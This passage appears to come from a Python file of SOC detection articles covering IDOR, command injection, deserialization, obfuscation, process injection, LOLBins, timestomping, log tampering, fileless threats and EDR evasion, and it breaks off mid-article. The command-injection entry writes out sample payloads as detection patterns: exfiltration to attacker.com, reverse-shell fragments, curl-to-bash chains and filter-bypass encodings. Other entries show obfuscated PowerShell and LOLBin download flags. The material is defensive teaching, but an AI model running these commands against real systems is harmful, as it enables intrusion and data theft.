| T1190 | Exploit Public-Facing Application | Initial Access |

## Understanding BOLA/IDOR

APIs commonly reference objects by predictable identifiers:

```
GET /api/users/12345/profile      → User profile
GET /api/orders/67890/invoice     → Order invoice
GET /api/documents/abcdef/download → Document download
```

If the API does not verify that the authenticated user owns or has permission to access the referenced object, any authenticated user can access any object by changing the ID.

## Detection Indicators

**Access Log Patterns:**

- A single user session accessing sequential or enumerated object IDs
- Rapid requests to the same endpoint with different ID parameters
- 200 OK responses for object IDs that do not belong to the requesting user
- Automated enumeration: IDs incrementing by 1 in sequential requests
- Burst of requests with random UUIDs (fuzzing for valid identifiers)

**Behavioral Anomalies:**

- User accessing significantly more unique object IDs than their peer group
- Cross-tenant data access in multi-tenant applications
- Access to object IDs that were never referenced in prior user sessions
- API calls with modified ID parameters following a legitimate request (tampered IDs)

**Response Analysis:**

- Identical API responses regardless of the authenticated user (missing authorization)
- Detailed error messages revealing valid vs. invalid object IDs
- Mass data retrieval through pagination parameter manipulation (`?limit=10000`)

## Related API Vulnerabilities

**Broken Function Level Authorization (BFLA):**
Users accessing admin-only API endpoints by guessing or discovering endpoint paths (e.g., `/api/admin/users` accessible to normal users).

**Mass Assignment:**
APIs that accept more fields than intended, allowing users to modify protected attributes (e.g., setting `role: admin` in a profile update request).

**Rate Limiting Absence:**
APIs without rate limits allow attackers to enumerate valid object IDs at high speed.

## Investigation Steps

1. Review API access logs for unusual patterns of object ID access
2. Map which user sessions accessed which object IDs
3. Cross-reference accessed objects with user ownership/permission data
4. Identify whether sequential or randomized enumeration was used
5. Determine the volume of unauthorized data accessed
6. Check for downstream impact: was accessed data exported or exfiltrated

## Prevention

- Implement object-level authorization checks on every API endpoint
- Use unpredictable identifiers (UUIDs v4) instead of sequential integers
- Log and monitor object access patterns for anomaly detection
- Implement rate limiting per user and per endpoint
- Conduct API security testing with authorization-focused test cases

## Key Takeaway

BOLA/IDOR is prevalent because it is simple to exploit and difficult to detect with automated scanning. Detection requires correlating API access logs with authorization context — who accessed what, and were they supposed to have access. Monitoring object ID access patterns per user session is the most effective detection strategy.
""",
    },
    {
        "title": "Command Injection Patterns — OS Command Execution via Web Apps",
        "tags": ["command-injection", "T1190", "T1059", "web-security", "rce", "detection"],
        "content": r"""# Command Injection Patterns — OS Command Execution via Web Apps

## Overview

Command injection occurs when an application passes unsanitized user input to operating system commands. Successful exploitation grants the attacker the ability to execute arbitrary commands on the server with the privileges of the web application process. This article covers detection patterns for identifying command injection attempts in web logs.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command and Scripting Interpreter | Execution |

## Injection Mechanics

Applications vulnerable to command injection typically use functions like `os.system()`, `exec()`, `subprocess.call()` with `shell=True`, or backtick execution. The attacker injects shell metacharacters to chain additional commands:

- Semicolon: `; whoami` (execute after)
- Pipe: `| cat /etc/passwd` (pipe output)
- AND: `&& id` (execute if prior succeeds)
- OR: `|| id` (execute if prior fails)
- Backtick: `` `whoami` `` (command substitution)
- Dollar-paren: `$(whoami)` (command substitution)
- Newline: `%0a id` (new command line)

## Detection Patterns

**Request-Level Indicators:**

Monitor URL parameters, POST bodies, headers, and cookies for:
- Shell metacharacters in parameters that should be simple values
- Common recon commands: `whoami`, `id`, `uname`, `ifconfig`, `ipconfig`, `hostname`
- File access commands: `cat`, `type`, `more`, `less`, `head`, `tail`
- Network commands: `ping`, `nslookup`, `curl`, `wget`, `nc`, `ncat`
- Download and execute chains: `curl ... | bash`, `wget ... -O /tmp/x && chmod +x`
- Reverse shell patterns: `bash -i >& /dev/tcp/`, `nc -e /bin/sh`

**Encoded Payloads:**

Attackers encode injection payloads to bypass WAF:
- URL encoding: `%3B` (;), `%7C` (|), `%26` (&)
- Base64 encoded commands: `echo BASE64 | base64 -d | sh`
- Hex encoding: `$'\x77\x68\x6f\x61\x6d\x69'` (whoami in hex)
- Variable substitution: `w${IFS}h${IFS}o${IFS}a${IFS}m${IFS}i` (bypass space filtering)

**Response Indicators:**

- Response body containing OS command output (usernames, system info, directory listings)
- Unusual response sizes from endpoints that normally return fixed-format data
- Server-initiated outbound connections (reverse shells, data exfiltration)
- Timing anomalies from `sleep` or `ping -c` delay commands

## Blind Command Injection

When output is not returned in the response:
- **Time-based:** `; sleep 10` — detect by response time increase
- **DNS-based:** `; nslookup $(whoami).attacker.com` — detect via DNS logs
- **HTTP-based:** `; curl http://attacker.com/$(whoami)` — detect via outbound connections

## Investigation Steps

1. Identify the vulnerable parameter and decode any encoding
2. Determine if the injection was successful (response analysis, timing, callbacks)
3. Identify what commands were executed and their impact
4. Check for persistence mechanisms (cron jobs, SSH keys, web shells dropped)
5. Review the application process's privilege level (run as root = worst case)
6. Search for follow-up activity: lateral movement, privilege escalation, data access

## Key Takeaway

Command injection detection focuses on identifying shell metacharacters and OS command patterns in HTTP request parameters. WAF rules must cover multiple encoding schemes. Any successful command injection should be treated as a full server compromise until proven otherwise.
""",
    },
    {
        "title": "Deserialization Risks — Detecting Object Injection Attacks",
        "tags": ["deserialization", "T1190", "web-security", "rce", "java", "detection"],
        "content": r"""# Deserialization Risks — Detecting Object Injection Attacks

## Overview

Insecure deserialization occurs when an application reconstructs objects from untrusted serialized data without proper validation. Attackers craft malicious serialized payloads that trigger arbitrary code execution, denial of service, or authentication bypass during the deserialization process. This vulnerability class is especially critical in Java, .NET, PHP, and Python applications.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command and Scripting Interpreter | Execution |

## How Deserialization Attacks Work

Serialization converts an object into a byte stream for storage or transmission. Deserialization reverses this process. If the application deserializes user-controlled data, an attacker can inject an object that triggers malicious actions during reconstruction.

**Gadget Chains:** Attackers chain together existing classes (gadgets) in the application's classpath to achieve code execution. The deserialized object triggers a sequence of method calls that ultimately execute an OS command.

## Language-Specific Indicators

**Java:**
- Serialized Java objects begin with hex bytes `AC ED 00 05` or Base64 `rO0AB`
- Common vulnerable classes: `ObjectInputStream.readObject()`, Apache Commons Collections, Spring Framework
- Tools like `ysoserial` generate gadget chain payloads for known libraries
- Content-Type headers: `application/x-java-serialized-object`

**PHP:**
- Serialized strings contain type indicators: `O:4:"User":2:{...}` (object with class name)
- Magic methods `__wakeup()`, `__destruct()`, `__toString()` are triggered during deserialization
- POP (Property-Oriented Programming) chains exploit method call sequences

**.NET:**
- `BinaryFormatter`, `SoapFormatter`, `ObjectStateFormatter` are common deserializers
- ViewState parameter (`__VIEWSTATE`) may contain serialized .NET objects
- `TypeNameHandling` in JSON.NET can trigger arbitrary type instantiation

**Python:**
- `pickle.loads()` and `yaml.load()` (without `SafeLoader`) execute arbitrary code
- Pickled data can contain `__reduce__` methods that call `os.system()`

## Detection Strategies

**Network-Level:**
- Monitor for Java serialization magic bytes (`AC ED 00 05`) in HTTP request bodies
- Flag requests with `Content-Type: application/x-java-serialized-object`
- Detect Base64-encoded serialized payloads in parameters and cookies
- Watch for unusually large cookie values or hidden form fields containing serialized data

**Application-Level:**
- Log deserialization operations and the classes being instantiated
- Alert on deserialization of classes from known gadget chain libraries
- Monitor for exceptions thrown during deserialization (failed exploitation attempts)

**Endpoint-Level:**
- Detect unexpected child processes spawned by web application processes
- Monitor for `cmd.exe` or `/bin/sh` executed by Java, .NET, or PHP processes
- Watch for outbound connections initiated immediately after deserialization errors

## Investigation Steps

1. Capture the serialized payload from the HTTP request
2. Identify the serialization format (Java, PHP, .NET, Python pickle)
3. Decode and analyze the payload to determine the intended gadget chain
4. Check if the attack was successful by correlating with process and network logs
5. Identify the deserialization entry point in the application
6. Assess exposure: what libraries are in the classpath that provide gadget chains

## Key Takeaway

Deserialization attacks are difficult to detect with traditional WAF rules because payloads are often binary or encoded. Detection requires monitoring for serialization format markers in HTTP traffic, logging deserialization events at the application level, and correlating with endpoint telemetry for unexpected process execution. Prevention centers on avoiding deserialization of untrusted data entirely.
""",
    },
]

# ============================================================
# COLLECTION 3: DEFENSE EVASION DETECTION
# ============================================================

EVASION = [
    {
        "title": "Script Obfuscation Indicators — Detecting Hidden Malicious Code",
        "tags": ["obfuscation", "T1027", "powershell", "javascript", "detection", "deobfuscation"],
        "content": r"""# Script Obfuscation Indicators — Detecting Hidden Malicious Code

## Overview

Attackers obfuscate scripts to bypass signature-based detection, complicate analysis, and delay incident response. Recognizing obfuscation patterns is a critical skill for SOC analysts triaging alerts involving PowerShell, JavaScript, VBScript, and Bash scripts. This article covers common obfuscation techniques and their detection indicators.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1027 | Obfuscated Files or Information | Defense Evasion |
| T1027.010 | Command Obfuscation | Defense Evasion |
| T1059.001 | PowerShell | Execution |
| T1059.007 | JavaScript | Execution |

## PowerShell Obfuscation Techniques

**String Manipulation:**
- Concatenation: `'Down'+'load'+'String'` reconstructs `DownloadString`
- Character insertion and removal: `'DxoAwxnAlxoAxdxSxtxrxixnxg'.replace('x','')`
- Reverse strings: `(-join('gnirtSdaolnwoD'[-1..-15]))`
- Format strings: `'{2}{0}{1}' -f 'oadStr','ing','Downl'`

**Encoding:**
- Base64: `-EncodedCommand` parameter or `[Convert]::FromBase64String()`
- ASCII/Unicode byte arrays: `[char]68+[char]111+[char]119+[char]110` = "Down"
- Compression: `IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(...)))`
- SecureString abuse: converting encrypted strings as an encoding mechanism

**Invocation Hiding:**
- Alias and cmdlet name fragmentation: `& ('IEX')`, `.(gcm *ke-*pr*)`
- Invoke-Expression variants: `IEX`, `iex`, `.('Invoke-Expression')`
- Variable-based invocation: `$x = 'IEX'; & $x $payload`
- Tick marks: `` I`nv`o`ke-`Ex`pre`ss`io`n `` (PowerShell ignores backticks in identifiers)

## JavaScript Obfuscation

- `eval()` or `Function()` constructors executing dynamically built strings
- `String.fromCharCode()` arrays reconstructing code character by character
- Hexadecimal string encoding: `\x48\x65\x6c\x6c\x6f`
- Array mapping and joining to build function names
- `atob()` for Base64 decoding combined with `eval()`
- Variable name mangling: all identifiers replaced with random strings

## Detection Indicators

**High-Confidence Signals:**
- Scripts containing Base64 strings longer than 100 characters
- Multiple string concatenation operations reconstructing API or method names
- `Invoke-Expression` (or aliases) combined with string decoding
- `eval()` combined with `fromCharCode`, `atob`, or string concatenation
- Shannon entropy of script content exceeding 4.5 bits/character
- Compression/decompression functions followed by execution primitives

**Process-Level:**
- PowerShell launched with `-EncodedCommand`, `-e`, `-enc` parameters
- PowerShell with `-WindowStyle Hidden` or `-NonInteractive` flags
- `wscript.exe` or `cscript.exe` executing scripts from temp directories
- Script interpreter processes with command lines exceeding 1000 characters

## Analysis Approach

1. Extract the raw script content from the alert or log entry
2. Identify the obfuscation layers (encoding, concatenation, compression)
3. Deobfuscate iteratively — peel one layer at a time
4. Use sandboxed environments for dynamic deobfuscation (let the script decode itself)
5. Log the deobfuscated result and analyze the true intent
6. Extract IOCs (URLs, IPs, file paths, registry keys) from the decoded payload

## Key Takeaway

Obfuscation is not inherently malicious — some legitimate tools obfuscate code for intellectual property protection. However, obfuscation combined with execution primitives (IEX, eval) and suspicious context (email attachment, temp directory, encoded command line) strongly indicates malicious intent. Focus on the behavioral context, not just the obfuscation itself.
""",
    },
    {
        "title": "Process Injection Types and Detection — Identifying Code Injection",
        "tags": ["process-injection", "T1055", "defense-evasion", "edr", "memory-forensics"],
        "content": r"""# Process Injection Types and Detection — Identifying Code Injection

## Overview

Process injection allows attackers to execute code within the address space of another process, inheriting its privileges and trust level. This technique evades security tools that whitelist trusted processes and enables access to process-specific resources like credentials in memory. Detection requires understanding injection methods and their observable artifacts.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1055.001 | DLL Injection | Defense Evasion, Privilege Escalation |
| T1055.002 | Portable Executable Injection | Defense Evasion |
| T1055.003 | Thread Execution Hijacking | Defense Evasion |
| T1055.004 | Asynchronous Procedure Call Injection | Defense Evasion |
| T1055.008 | Ptrace System Call | Defense Evasion |
| T1055.012 | Process Hollowing | Defense Evasion |

## Common Injection Techniques

**Classic DLL Injection (T1055.001):**
The attacker opens a handle to the target process, allocates memory, writes a DLL path, and creates a remote thread calling `LoadLibrary`. Detection: monitor for `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` API call sequences.

**Process Hollowing (T1055.012):**
A legitimate process is created in a suspended state, its memory is unmapped and replaced with malicious code, then resumed. The malicious code runs under the identity of the legitimate process. Detection: processes where the in-memory image differs from the on-disk binary.

**APC Injection (T1055.004):**
Code is queued as an Asynchronous Procedure Call to a thread in the target process. When the thread enters an alertable wait state, the injected code executes. Detection: `QueueUserAPC` calls targeting threads in remote processes.

**Thread Execution Hijacking (T1055.003):**
A thread in the target process is suspended, its instruction pointer is redirected to injected code, and then resumed. Detection: `SuspendThread` + `SetThreadContext` + `ResumeThread` sequences targeting remote processes.

**Reflective DLL Injection:**
A DLL is loaded entirely from memory without touching disk or using the Windows loader. The DLL contains its own loader that resolves imports and relocations. Detection: loaded modules with no corresponding file on disk.

## Detection Strategies

**API Monitoring:**
- Cross-process memory operations: `WriteProcessMemory`, `NtWriteVirtualMemory`
- Remote thread creation: `CreateRemoteThread`, `NtCreateThreadEx`, `RtlCreateUserThread`
- Process handle acquisition with specific access rights: `PROCESS_VM_WRITE`, `PROCESS_CREATE_THREAD`

**Behavioral Indicators:**
- Legitimate processes (explorer.exe, svchost.exe) with unexpected loaded modules
- Processes with in-memory sections not backed by on-disk files
- Memory regions with RWX (read-write-execute) permissions in otherwise normal processes
- Network connections from processes that typically do not communicate externally

**Memory Analysis:**
- Scan for executable memory regions without corresponding loaded modules
- Compare in-memory process image against the on-disk binary (detect hollowing)
- Look for PE headers in non-image memory allocations
- Identify injected threads by examining thread start addresses outside loaded modules

## Investigation Steps

1. Identify the source process that performed the injection
2. Determine the injection technique from API call patterns
3. Extract the injected code from memory for analysis
4. Assess what the injected code is doing (C2, credential theft, lateral movement)
5. Check for persistence mechanisms established by the injected code
6. Trace the full attack chain: how did the injecting process get compromised

## Key Takeaway

Process injection is a fundamental evasion technique. Detection requires monitoring cross-process API calls, comparing in-memory process state against on-disk binaries, and alerting on anomalous behaviors from otherwise trusted processes. EDR solutions and Sysmon provide critical visibility into these operations.
""",
    },
    {
        "title": "Living Off the Land Binaries — LOLBins Awareness for Analysts",
        "tags": ["lolbins", "T1218", "defense-evasion", "living-off-the-land", "detection"],
        "content": r"""# Living Off the Land Binaries — LOLBins Awareness for Analysts

## Overview

Living Off the Land Binaries (LOLBins) are legitimate, signed system utilities that attackers repurpose for malicious activities. Because these binaries are trusted by the operating system and security tools, their misuse bypasses application whitelisting, evades detection, and blends with normal system activity. Analysts must understand common LOLBin abuse patterns to detect this technique.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1218 | System Binary Proxy Execution | Defense Evasion |
| T1218.005 | Mshta | Defense Evasion |
| T1218.010 | Regsvr32 | Defense Evasion |
| T1218.011 | Rundll32 | Defense Evasion |
| T1197 | BITS Jobs | Defense Evasion, Persistence |
| T1216 | System Script Proxy Execution | Defense Evasion |

## Commonly Abused LOLBins

**Execution:**
- `mshta.exe`: Executes HTML applications (.hta) or inline VBScript/JavaScript. Often used to download and execute payloads.
- `rundll32.exe`: Loads and executes DLL functions. Abused to execute malicious DLLs or JavaScript via `javascript:` protocol handler.
- `regsvr32.exe`: Registers COM DLLs. The `/s /n /u /i:URL` flags fetch and execute remote scriptlets (SCT files) without writing to disk.
- `certutil.exe`: Certificate utility repurposed for downloading files (`-urlcache -split -f`) and Base64 decoding (`-decode`).
- `msiexec.exe`: Installs MSI packages from remote URLs, executing embedded scripts.

**Download:**
- `bitsadmin.exe`: Windows Background Intelligent Transfer Service — downloads files in the background with built-in retry and persistence.
- `certutil.exe`: Downloads files via `-urlcache` flag.
- `curl.exe` / `wget` (if present): Direct download utilities.

**Bypassing Controls:**
- `cmstp.exe`: Installs Connection Manager profiles, can execute arbitrary commands via INF files.
- `wmic.exe`: Windows Management Instrumentation — executes processes, queries system info, and can run XSL-based scripts.
- `forfiles.exe`: Executes commands on file search results — can run arbitrary programs.
- `pcalua.exe`: Program Compatibility Assistant — launches executables, bypassing some restrictions.

## Detection Strategies

**Command-Line Monitoring:**
The key to LOLBin detection is monitoring command-line arguments. The binaries themselves are legitimate; the arguments reveal malicious intent:

- `certutil` with `-urlcache`, `-decode`, or `-encode` flags
- `mshta` with HTTP/HTTPS URLs or inline script content
- `regsvr32` with `/i:http` or `/i:` followed by a URL
- `bitsadmin` creating transfer jobs to external URLs
- `rundll32` with JavaScript protocol handlers or DLLs from temp directories
- `wmic` with `/node:` targeting remote hosts or `process call create`

**Parent-Child Relationships:**
- Office applications (winword.exe, excel.exe) spawning LOLBins
- Script interpreters launching LOLBins with download arguments
- LOLBins spawning cmd.exe, powershell.exe, or other LOLBins (chaining)

**Network Context:**
- LOLBins making outbound HTTP/HTTPS connections (especially to non-corporate domains)
- File downloads to %TEMP%, %APPDATA%, or other user-writable directories

## Analyst Response

1. Check the full command line, not just the process name
2. Identify the parent process — how was the LOLBin launched
3. Determine if files were downloaded and where they were written
4. Check for subsequent execution of downloaded payloads
5. Reference LOLBAS project (lolbas-project.github.io) for comprehensive LOLBin documentation
6. Correlate with other alerts from the same host and time window

## Key Takeaway

LOLBin abuse is one of the most common evasion techniques because it requires no additional tooling. Detection pivots from binary reputation to command-line argument analysis and parent-child process chain inspection. Invest in command-line logging (Sysmon Event ID 1, Windows Event ID 4688 with command-line auditing) as the foundation for LOLBin detection.
""",
    },
    {
        "title": "Timestomping Detection — Identifying Manipulated File Timestamps",
        "tags": ["timestomping", "T1070.006", "defense-evasion", "forensics", "mft", "detection"],
        "content": r"""# Timestomping Detection — Identifying Manipulated File Timestamps

## Overview

Timestomping is the modification of file timestamps to blend malicious files with legitimate system files or to disrupt forensic timeline analysis. Attackers alter creation, modification, access, and entry modification times to make recently dropped malware appear old and innocuous. Detection requires comparing multiple timestamp sources and identifying temporal anomalies.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1070.006 | Indicator Removal: Timestomp | Defense Evasion |

## NTFS Timestamps Explained

Each NTFS file has two sets of timestamps stored in the Master File Table (MFT):

**$STANDARD_INFORMATION ($SI):**
- Created, Modified, Accessed, MFT Entry Modified (MACE)
- Easily modified by user-space tools and APIs (`SetFileTime`, `touch`, `NtSetInformationFile`)
- This is what Windows Explorer and `dir` display

**$FILE_NAME ($FN):**
- Also stores MACE timestamps
- Updated by the NTFS kernel driver, not directly modifiable by user-space tools
- Requires raw disk access or kernel-mode code to manipulate (significantly harder)

## Detection Techniques

**$SI vs $FN Comparison:**
The most reliable detection method compares timestamps between the two MFT attributes:
- $SI Created timestamp earlier than $FN Created timestamp is a strong timestomping indicator
- $SI Modified timestamp significantly different from $FN Modified timestamp warrants investigation
- Legitimate scenarios rarely produce $SI timestamps predating $FN timestamps

**Temporal Anomalies:**
- Files with timestamps predating the operating system installation date
- Files in user-writable directories (Temp, AppData) with timestamps years in the past
- Compilation timestamps (PE header) inconsistent with file system timestamps
- Files created during a known intrusion window but bearing old timestamps

**Contextual Anomalies:**
- Recently dropped files (based on $FN or MFT sequence number) with old $SI timestamps
- Files whose content or filename pattern is inconsistent with their apparent age
- Malware samples with timestamps matching well-known system files (e.g., matching `notepad.exe` timestamps)

## Investigation Tools and Methods

**MFT Analysis:**
- Parse the raw MFT to extract both $SI and $FN timestamps
- Tools: `MFTECmd` (Eric Zimmerman), `analyzeMFT`, `Autopsy`, `Plaso/log2timeline`
- Look for entries where $SI.Created < $FN.Created

**USN Journal:**
- The Update Sequence Number journal records file system changes with its own timestamps
- Provides an independent timeline to validate file creation and modification events
- A file appearing in the USN journal as recently created but having old $SI timestamps confirms timestomping

**Event Logs:**
- Sysmon Event ID 2 (FileCreateTime changed) directly records timestamp modifications
- Windows Security Event ID 4663 (object access) can indicate file manipulation
- Correlate file access events with timestamp anomalies

## Common Attacker Tools

Timestomping functionality is built into most post-exploitation frameworks:
- Cobalt Strike: `timestomp` command in Beacon
- Metasploit: `timestomp` module in Meterpreter
- PowerShell: `Set-ItemProperty` with `CreationTime`, `LastWriteTime`, `LastAccessTime`
- Native: `touch` (Linux), `SetFileTime` API (Windows)

## Analyst Workflow

1. During triage, always check both $SI and $FN timestamps for suspicious files
2. Compare file timestamps against the USN journal and Sysmon logs
3. Check PE compilation timestamps against file system timestamps
4. Build a comprehensive timeline using Plaso/log2timeline for the investigation period
5. Document timestamp discrepancies as evidence of anti-forensic activity

## Key Takeaway

Timestomping detection relies on the fact that attackers typically modify only $STANDARD_INFORMATION timestamps while $FILE_NAME timestamps remain untouched. Comparing these two MFT attribute sets is the most reliable detection method. Enable Sysmon Event ID 2 to capture timestamp modifications in real time.
""",
    },
    {
        "title": "Log Tampering Signs — Detecting Evidence Destruction",
        "tags": ["log-tampering", "T1070.001", "T1070.002", "defense-evasion", "forensics", "integrity"],
        "content": r"""# Log Tampering Signs — Detecting Evidence Destruction

## Overview

Attackers frequently tamper with logs to hide their activities and impede forensic investigation. Log tampering ranges from simple event log clearing to selective entry deletion and log forwarding disruption. Detecting log tampering is critical because it often indicates a sophisticated adversary attempting to cover an active intrusion.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| T1070.002 | Indicator Removal: Clear Linux or Mac System Logs | Defense Evasion |
| T1562.002 | Impair Defenses: Disable Windows Event Logging | Defense Evasion |
| T1562.006 | Impair Defenses: Indicator Blocking | Defense Evasion |

## Windows Log Tampering Indicators

**Event Log Clearing:**
- Event ID 1102 (Security log cleared) — this event is generated even when the Security log itself is cleared, as it is written by a separate auditing process
- Event ID 104 (System log cleared) in the System log
- Sudden gaps in event log continuity (missing Event Record IDs)
- Event log files with unusually small sizes or recent creation timestamps

**Selective Event Deletion:**
- Gaps in sequential Event Record IDs (missing record numbers in an otherwise continuous sequence)
- Timeline gaps where events exist before and after but a specific window is empty
- Inconsistencies between local logs and centrally forwarded copies

**Service Disruption:**
- Windows Event Log service stopped (Event ID 7036 in System log)
- Event forwarding (WEF) subscription errors or connectivity breaks
- Sysmon service stopped or its driver unloaded
- Anti-virus or EDR service termination events

## Linux Log Tampering Indicators

**File-Level Tampering:**
- `/var/log/` files with modification times inconsistent with system uptime
- Log files with size zero or truncated content
- Missing log rotation files (e.g., `auth.log.1` exists but `auth.log` is empty)
- `wtmp` and `utmp` binary logs with corrupted or missing entries

**Process-Level Indicators:**
- `rsyslog`, `syslog-ng`, or `journald` service stopped or restarted unexpectedly
- Commands in bash history: `shred`, `truncate -s 0`, `> /var/log/auth.log`
- History file (`~/.bash_history`) cleared, truncated, or `HISTFILE=/dev/null` set
- Log forwarding agents (Filebeat, Fluentd) stopped or reconfigured

## Detection Strategies

**Log Integrity Monitoring:**
- Forward logs to a central SIEM in near-real-time (attackers cannot retroactively delete forwarded copies)
- Implement write-once or append-only log storage (immutable logging)
- Hash log files periodically and alert on unexpected changes
- Monitor file integrity of log directories with tools like AIDE, OSSEC, or Sysmon

**Gap Detection:**
- Alert when no events are received from a host for a configurable threshold (e.g., 15 minutes)
- Monitor Event Record ID sequences for gaps
- Track log source heartbeats in the SIEM — missing heartbeats indicate disruption

**Service Monitoring:**
- Alert on logging service stop/start/crash events
- Monitor EDR, Sysmon, and log forwarding agent health
- Detect processes that open event log files for write access
- Watch for `wevtutil cl` (clear log) and `Stop-Service` commands targeting logging services

## Investigation Steps

1. Check Event ID 1102/104 for explicit log clearing events
2. Compare local logs against centrally stored copies for discrepancies
3. Analyze Event Record ID sequences for gaps indicating selective deletion
4. Review service logs for logging service disruptions
5. Check process execution logs for log-clearing commands or tools
6. Examine file system timestamps on log files for evidence of modification

## Key Takeaway

Log tampering is itself evidence of compromise and should trigger immediate escalation. The best defense is centralized, immutable log forwarding — if logs are forwarded in real time to a write-protected SIEM, attackers cannot retroactively erase evidence. Monitor both log content and log infrastructure health to detect tampering attempts.
""",
    },
    {
        "title": "Fileless Technique Indicators — Detecting Memory-Only Threats",
        "tags": ["fileless", "T1620", "T1059.001", "defense-evasion", "memory-forensics", "detection"],
        "content": r"""# Fileless Technique Indicators — Detecting Memory-Only Threats

## Overview

Fileless techniques execute malicious code entirely in memory without writing persistent files to disk. This evades traditional antivirus that relies on file scanning and leaves minimal forensic artifacts on the filesystem. Detecting fileless threats requires monitoring process behavior, memory state, and runtime events rather than static file analysis.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1620 | Reflective Code Loading | Defense Evasion |
| T1059.001 | PowerShell | Execution |
| T1059.005 | Visual Basic | Execution |
| T1055 | Process Injection | Defense Evasion |
| T1218 | System Binary Proxy Execution | Defense Evasion |

## Fileless Attack Stages

**Stage 1 — Initial Execution:**
The entry point often involves a document macro, a browser exploit, or a legitimate tool. The key characteristic is that no standalone malicious executable is dropped.

Common entry vectors:
- Office macro downloads and executes PowerShell in memory
- HTML smuggling delivers encoded payload executed via JavaScript
- LOLBin executes code fetched from a remote URL
- WMI event subscription triggers script execution

**Stage 2 — Payload Execution in Memory:**
The payload runs within a legitimate process's memory space:
- PowerShell `Invoke-Expression` with downloaded script content
- .NET assembly loaded via `Assembly.Load()` from byte array
- Reflective DLL injection — DLL loaded without using Windows loader
- JavaScript/VBScript executed via `mshta.exe` or `wscript.exe`

**Stage 3 — Persistence (Optional):**
Fileless persistence mechanisms maintain access without files:
- WMI event subscriptions executing scripts on system events
- Registry-stored payloads (`HKLM\SOFTWARE\...`) executed by startup scripts
- Scheduled tasks calling PowerShell with encoded commands
- Group Policy script extensions

## Detection Indicators

**Process Behavior:**
- PowerShell or cmd.exe launched with no associated script file on disk
- Script interpreters (wscript, cscript, mshta) spawned by Office applications
- Long-running PowerShell processes with extensive network activity
- Processes loading .NET assemblies that do not exist as files on disk
- `powershell.exe` with `-EncodedCommand` parameter (Base64-encoded scripts)

**Memory Indicators:**
- Executable memory regions (PAGE_EXECUTE_READWRITE) in non-standard processes
- Loaded modules (DLLs) without corresponding files on the filesystem
- .NET assemblies loaded from byte arrays rather than file paths
- Shellcode patterns in process memory: NOP sleds, API hashing routines

**Registry and WMI:**
- Large binary data stored in registry values under non-standard keys
- WMI event consumers containing script code or command-line invocations
- Scheduled tasks with inline PowerShell commands rather than script file references
- Registry Run keys pointing to `powershell.exe -enc ...` commands

**Event Log Indicators:**
- PowerShell Script Block Logging (Event ID 4104) capturing decoded script content
- PowerShell Module Logging revealing loaded modules and method calls
- Sysmon Event ID 1 with extensive command-line arguments
- Sysmon Event ID 7 (Image Load) for unsigned or unusual DLLs

## Investigation Approach

1. Capture full process memory for any suspicious process before termination
2. Review PowerShell Script Block and Module logs for decoded script content
3. Check WMI subscriptions for persistence: `Get-WMIObject -Class __FilterToConsumerBinding`
4. Scan registry for large binary values in non-standard locations
5. Use memory forensics tools (Volatility) to analyze process memory dumps
6. Correlate network connections with process execution timeline

## Key Takeaway

Fileless threats shift the detection burden from file-based scanning to behavioral monitoring and memory analysis. Enable PowerShell Script Block Logging, deploy Sysmon with comprehensive configuration, and monitor for anomalous process behaviors. Memory forensics capability is essential for investigating fileless intrusions.
""",
    },
    {
        "title": "EDR Evasion Concepts — Understanding Detection Bypass Techniques",
        "tags": ["edr-evasion", "T1562.001", "defense-evasion", "edr", "detection-engineering"],
        "content": r"""# EDR Evasion Concepts — Understanding Detection Bypass Techniques

## Overview

Endpoint Detection and Response (EDR) solutions are the primary defense against advanced threats on endpoints. Attackers actively research and develop techniques to bypass EDR detection. Understanding these evasion methods helps SOC analysts and detection engineers identify gaps in coverage, tune detection rules, and investigate incidents where EDR was circumvented.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1562.004 | Impair Defenses: Disable or Modify System Firewall | Defense Evasion |
| T1014 | Rootkit | Defense Evasion |

## EDR Detection Mechanisms

To understand evasion, analysts must understand what EDR monitors:

**Userland Hooks:** EDR agents hook Windows API functions (ntdll.dll, kernel32.dll) by inserting jump instructions that redirect execution through the EDR's inspection code before the original function runs.

**Kernel Callbacks:** EDR registers kernel-mode callbacks for process creation, thread creation, image loading, and registry operations via APIs like `PsSetCreateProcessNotifyRoutine`.

**ETW (Event Tracing for Windows):** EDR consumes ETW providers for .NET, PowerShell, and network events.

**Mini-Filter Drivers:** File system mini-filters intercept file operations for real-time scanning.

## Evasion Categories

**Unhooking:**
Attackers overwrite EDR hooks in ntdll.dll by loading a fresh copy from disk or remapping the DLL from the KnownDLLs section. This restores original API function code, bypassing EDR inspection.

Detection: Monitor for processes that re-read ntdll.dll from disk or call `NtMapViewOfSection` to remap system DLLs. Track DLL load events for duplicate loads of system libraries.

**Direct System Calls:**
Instead of calling hooked ntdll.dll functions, attackers invoke system calls directly using `syscall` instructions with the appropriate system service numbers. This skips userland hooks entirely.

Detection: Detect threads executing syscall instructions from non-ntdll memory regions. Look for `syscall` instruction patterns in executable memory allocations.

**ETW Patching:**
Attackers patch `EtwEventWrite` in ntdll.dll to prevent ETW events from being generated. This blinds EDR solutions that rely on ETW telemetry.

Detection: Monitor for modifications to ETW-related functions. Periodically verify ETW provider integrity. Alert when expected ETW events stop arriving.

**Driver-Level Attacks:**
- Vulnerable signed drivers (BYOVD — Bring Your Own Vulnerable Driver) loaded to terminate EDR processes or remove kernel callbacks
- Popular vulnerable drivers: Dell DBUtil, Gigabyte, Process Explorer driver
